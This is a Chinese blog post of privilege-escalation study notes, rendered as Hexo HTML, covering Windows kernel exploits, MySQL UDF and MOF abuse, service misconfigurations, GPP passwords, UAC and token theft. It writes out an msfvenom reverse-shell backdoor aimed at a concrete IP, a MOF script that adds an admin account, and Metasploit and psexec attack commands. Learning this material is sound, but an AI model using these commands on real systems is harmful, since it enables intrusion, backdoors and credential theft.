@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="windows提权和linux提取总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限提升">
+<meta property="og:url" content="http://example.com/2022/04/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html">
+<meta property="og:site_name" content="Spring&#39;blog">
+<meta property="og:description" content="windows提权和linux提取总结">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1629882213713-99ae074e-533d-43b9-837d-6ec6c0914f33.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1629882218746-cf31d52a-379e-4264-aef2-16b5d3ecbd13.png">
+<meta property="og:image" content="d:/blog/githubblog/source/img/1605453393_5fb146513192ec6c15dae.png!small">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220406101923961.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220406105002375.png">
+<meta property="article:published_time" content="2022-04-03T13:55:16.000Z">
+<meta property="article:modified_time" content="2022-04-07T09:07:40.504Z">
+<meta property="article:author" content="Spring">
+<meta property="article:tag" content="权限提升">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1629882213713-99ae074e-533d-43b9-837d-6ec6c0914f33.png">
+
+<link rel="canonical" href="http://example.com/2022/04/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>权限提升 | Spring'blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Spring'blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我还年轻，吃苦趁现在。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">14</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Spring">
+      <meta itemprop="description" content="见到一座山，就想知道山后面是什么。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Spring'blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          权限提升
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-03 21:55:16" itemprop="dateCreated datePublished" datetime="2022-04-03T21:55:16+08:00">2022-04-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-07 17:07:40" itemprop="dateModified" datetime="2022-04-07T17:07:40+08:00">2022-04-07</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">windows提权和linux提取总结</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <span id="more"></span>
+
+<h1 id="Win-溢出漏洞及-AT-amp-SC-amp-PS-提权"><a href="#Win-溢出漏洞及-AT-amp-SC-amp-PS-提权" class="headerlink" title="Win 溢出漏洞及 AT&amp;SC&amp;PS 提权"></a>Win 溢出漏洞及 AT&amp;SC&amp;PS 提权</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1629882213713-99ae074e-533d-43b9-837d-6ec6c0914f33.png" alt="image.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/1629882218746-cf31d52a-379e-4264-aef2-16b5d3ecbd13.png" alt="image.png"></p>
+<h2 id="如何判断溢出漏洞？漏洞在哪里找？"><a href="#如何判断溢出漏洞？漏洞在哪里找？" class="headerlink" title="如何判断溢出漏洞？漏洞在哪里找？"></a>如何判断溢出漏洞？漏洞在哪里找？</h2><p>信息搜集-补丁筛选-利用MSF或者特定的EXP-执行-西瓜到手</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vulmap（需要power shell,cmd不行） </span><br><span class="line">Wesng（只需要systeminfo信息，web环境，本地提权都可以） </span><br><span class="line">WindowsVulnScan（跟上边的差不多，需要手工改写utf-8格式）</span><br></pre></td></tr></table></figure>
+
+<p>下载地址：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulmon/Vulmap">Vulmap</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">Wesng</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/chroblert/WindowsVulnScan">WindowsVulnScan</a></p>
+<h2 id="如何判断使用哪种数据库提权-数据库提权利用条件"><a href="#如何判断使用哪种数据库提权-数据库提权利用条件" class="headerlink" title="如何判断使用哪种数据库提权?数据库提权利用条件?"></a>如何判断使用哪种数据库提权?数据库提权利用条件?</h2><p>MSF工具，最好买一个服务器，linux的ubantu，安装msf</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43896364/article/details/117676325?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164905029116782089388931%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164905029116782089388931&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-13-117676325.142%5Ev5%5Epc_search_result_control_group,157%5Ev4%5Enew_style&utm_term=%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85msf&spm=1018.2226.3001.4187">msf搭建教程</a></p>
+<p>最后msfdb init 记得yes 按照流程弄完即可成功启动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=121.4.97.34 LPORT=5566 -f exe -o test.exe（服务器上生成后门）</span><br><span class="line">上传到肉机上，运行，反弹到121.4.97.34的5566端口</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 5566</span><br><span class="line">exploit</span><br><span class="line">反弹会话</span><br><span class="line"></span><br><span class="line">search ms16</span><br><span class="line">use 那个模块</span><br><span class="line">set session 3</span><br><span class="line">set payload...</span><br><span class="line">show options</span><br><span class="line">set lhost</span><br><span class="line">set lport</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chcp 65001</span><br><span class="line">2019-1388</span><br><span class="line">sessions -i</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="如何判断本地环境可利用漏洞情况-AT-amp-SC-amp-PS命令适用环境"><a href="#如何判断本地环境可利用漏洞情况-AT-amp-SC-amp-PS命令适用环境" class="headerlink" title="如何判断本地环境可利用漏洞情况?AT&amp;SC&amp;PS命令适用环境?"></a>如何判断本地环境可利用漏洞情况?AT&amp;SC&amp;PS命令适用环境?</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-0787 BitsArbitraryFileMoveExploit</span><br><span class="line"></span><br><span class="line">at 15:13 /interactive cmd.exe</span><br><span class="line"></span><br><span class="line">windows7之前</span><br><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line">sc start syscmd</span><br><span class="line"></span><br><span class="line"># 实测2012 R2成功</span><br><span class="line"># 需要下载微软官网的pstools</span><br><span class="line"># https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</span><br><span class="line">psexec.exe -accepteula -s -i -d cmd.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="MY-amp-MS-amp-ORA-等-SQL-数据库提权"><a href="#MY-amp-MS-amp-ORA-等-SQL-数据库提权" class="headerlink" title="MY&amp;MS&amp;ORA 等 SQL 数据库提权"></a>MY&amp;MS&amp;ORA 等 SQL 数据库提权</h1><p>提权必要条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">具有MySQL的root权限，且MySQL以system权限运行。</span><br><span class="line">具有执行SQL语句的权限。</span><br><span class="line">获取root密码的方法：</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Mysql数据库提权演示-脚本-amp-MSF"><a href="#Mysql数据库提权演示-脚本-amp-MSF" class="headerlink" title="Mysql数据库提权演示-脚本&amp;MSF"></a>Mysql数据库提权演示-脚本&amp;MSF</h2><p>流程:服务探针-信息收集-提权利用-获取权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql3306</span><br><span class="line">oracle1521</span><br><span class="line">sqlsever1433</span><br></pre></td></tr></table></figure>
+
+<p>mysql的data文件里MYD文件储存内容</p>
+<h3 id="UDF提权知识点（基于mysql调用命令执行函数）"><a href="#UDF提权知识点（基于mysql调用命令执行函数）" class="headerlink" title="UDF提权知识点（基于mysql调用命令执行函数）"></a>UDF提权知识点（基于mysql调用命令执行函数）</h3><p>·读取网站数据库配置文件（了解其命名规则及查找技巧)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql data inc config conn database common include等</span><br></pre></td></tr></table></figure>
+
+
+<p>·读取数据库存储或备份文件（了解其数据库存储格式及对应内容)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@@basedir/data/数据库名/表名.myd</span><br></pre></td></tr></table></figure>
+
+<p>·利用脚本暴力猜解（了解数据库是否支持外联及如何开启外联)·远程本地暴力猜解，服务器本地暴力猜解</p>
+<p>·利用自定义执行函数导出dl文件进行命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">必须有root权限</span><br><span class="line">select version()版本</span><br><span class="line">select @@basedir安装目录</span><br></pre></td></tr></table></figure>
+
+<p>手工创建plugin目录或利用NTFS流创建<br>select ‘x’ into dumpfile ‘目录&#x2F;lib&#x2F;plugin:lNDEX_ALLOCATION”;</p>
+<p>1.mysql&lt;5.1导出目录c:&#x2F;windows 或 system32<br>2.mysql&#x3D;&gt;5.1导出安装目录&#x2F;lib&#x2F;plugin&#x2F;</p>
+<h3 id="MOF知识点-基于MYSQL特性的安全问题"><a href="#MOF知识点-基于MYSQL特性的安全问题" class="headerlink" title="MOF知识点:(基于MYSQL特性的安全问题)"></a>MOF知识点:(基于MYSQL特性的安全问题)</h3><p>原理</p>
+<p>mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof)叫做”托管对象格式””其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上转的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
+<p>过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在可写目录中上传mof文件。</span><br><span class="line">把mof文件上传到`C:/wmpub/nullevt.mof`</span><br><span class="line">把这个文件复制到`C:/Windows/System32/wbem/MOF/nullevt.mof`目录下</span><br><span class="line"></span><br><span class="line">select load_file(&#x27;C:/wmpub/nullevt.mof&#x27;) into dumpfile &#x27;C:/Windows/System32/wbem/MOF/nullevt.mof</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将下面这段代码复制到mof后缀的文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># pragma namespace(&quot;\.\root\subscription&quot;)</span><br><span class="line">instance of EventFilter as $EventFilter&#123; EventNamespace =&quot;Root\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new</span><br><span class="line">ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="启动项知识点-基于配合操作系统自启动"><a href="#启动项知识点-基于配合操作系统自启动" class="headerlink" title="启动项知识点:(基于配合操作系统自启动)"></a>启动项知识点:(基于配合操作系统自启动)</h3><p>导出自定义可执行文件到启动目录配合重启执行<br>将创建好的后门或执行文件进行服务器启动项写入，配合重启执行!</p>
+<h1 id="Win提权方法总结"><a href="#Win提权方法总结" class="headerlink" title="Win提权方法总结"></a>Win提权方法总结</h1><p><img src="D:\blog\githubblog\source\img\1605453393_5fb146513192ec6c15dae.png!small" alt="1605453393_5fb146513192ec6c15dae.png!small"></p>
+<h2 id="内核溢出漏洞提权"><a href="#内核溢出漏洞提权" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h2><h2 id="系统配置错误提权"><a href="#系统配置错误提权" class="headerlink" title="系统配置错误提权"></a>系统配置错误提权</h2><h3 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h3><p>Windows在系统启动时，会伴随着一些高权服务启动，倘若某些服务存在一些漏洞，那么就能够借此服务进行权限劫持</p>
+<p>实现方法可借助：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Powershell中的PowerUp脚本</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</span><br><span class="line"></span><br><span class="line">2.Metasploit中的攻击模块   #需要提前获取一个session</span><br><span class="line">exploit/windows/local/service_permissions</span><br></pre></td></tr></table></figure>
+
+<h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><p>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的</p>
+<p>MSF使用实战：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#寻找存在漏洞的服务</span><br><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">#msf攻击模块</span><br><span class="line">exploit/windows/local/trusted_service_path</span><br><span class="line"></span><br><span class="line">#正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程</span><br><span class="line">set AutoRunScript migrate -f</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查看计算机的计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line">#查看指定目录的权限配置情况</span><br><span class="line">accesschk.exe -dqv &quot;D:\test&quot; -accepteula</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h2><p>常见的组策略首选项(Group Policy Preferences,GPP)列举如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">映射驱动器(Drives.xml)</span><br><span class="line">创建本地用户</span><br><span class="line">数据源(DataSources.xml)</span><br><span class="line">打印机配置(Printers.xml)</span><br><span class="line">创建、更新服务(Services.xml)</span><br><span class="line">计划任务(ScheduledTasks.xml)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Powershell获取cpassword</span><br><span class="line">Get-GPPPassword.ps1</span><br><span class="line"></span><br><span class="line">#Msf</span><br><span class="line">post/windows/gather/credentials/gpp</span><br><span class="line"></span><br><span class="line">#Empire</span><br><span class="line">usemodule privesc/gpp</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><p>UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。</p>
+<p>在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。</p>
+<p>在权限不够的情况下，访问系统磁盘的根目录、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证。</p>
+<p>需要UAC的授权才能进行的操作列表如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">配置Windows Update</span><br><span class="line">增加、删除账户</span><br><span class="line">更改账户类型</span><br><span class="line">更改UAC的设置</span><br><span class="line">安装ActiveX</span><br><span class="line">安装、卸载程序</span><br><span class="line">安装设备驱动程序</span><br><span class="line">将文件移动/复制到Program Files或Windows目录下</span><br><span class="line">查看其它用户的文件夹</span><br></pre></td></tr></table></figure>
+
+
+
+<p>UAC有如下四种设置要求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户</span><br><span class="line">仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</span><br><span class="line">仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</span><br><span class="line">从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。</p>
+<p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</p>
+<p>令牌分类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问令牌(Access Token)：表示访问控制操作主体的系统对象</span><br><span class="line">会话令牌(Session Token)：是交互会话中唯一的身份标识符。</span><br><span class="line">密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾</span><br></pre></td></tr></table></figure>
+
+<p>Windows的AccessToken有两种类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Delegation Token：授权令牌，它支持交互式会话登录(例如本地用户直接登录、远程桌面登录访问)</span><br><span class="line">Impresonation Token：模拟令牌，它是非交互的会话(例如使用net use访问共享文件夹)</span><br></pre></td></tr></table></figure>
+
+<p>Windows Access Token产生过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="实例"><a href="#实例" class="headerlink" title="*实例"></a>*实例</h3><p>2008之前的版本有用</p>
+<p>先用msf生成后门</p>
